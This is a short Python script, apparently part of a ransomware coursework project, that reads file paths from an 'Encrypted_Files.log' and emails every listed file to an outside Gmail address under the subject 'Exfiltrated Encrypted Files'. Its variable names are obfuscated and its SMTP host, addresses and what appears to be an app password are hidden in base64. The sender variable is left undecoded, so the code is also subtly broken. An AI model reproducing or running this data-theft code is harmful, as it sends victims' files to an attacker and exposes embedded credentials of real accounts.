import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import base64

A = "c21wdC5nbWFpbC5jb20="  
B = 587
C = "bm90LnNlY3VyZS5tYWlsMTIzQGdtYWlsLmNvbQ=="  
D = "dXZiZCBldm95IGR2b2ogdGVvdg=="  
E = "aHdzYWJkZWxnYXdhZEBnbWFpbC5jb20="  
F = "/home/hgawad/Desktop/coursework/Encrypted_Files.log"
G = base64.b64decode(A).decode()
H = C  
I = base64.b64decode(D).decode()
J = base64.b64decode(E).decode()

def K(L):
    M = []
    with open(L, "r") as N:
        O = N.readlines()

    for P in O:
        M.append(P.strip())
    return M
       
def Q(R):
    S = MIMEMultipart()
    S['From'] = H
    S['To'] = J
    S['Subject'] = "Exfiltrated Encrypted Files"
    S.attach(MIMEText(f"Attached {len(R)} encrypted files.", 'plain'))

    for T in R:
            with open(T, "rb") as U:
                V = MIMEBase('application', 'octet-stream')
                V.set_payload(U.read())
                encoders.encode_base64(V)
                V.add_header(
                    'Content-Disposition',
                    f'attachment; filename="{os.path.basename(T)}"'
                )
                S.attach(V)
    return S

def W(X):
    with smtplib.SMTP(G, B) as Y:
            Y.starttls()  
            Y.login(H, I)
            Y.send_message(X)

Z = K(F)
A1 = Q(Z)
W(A1)

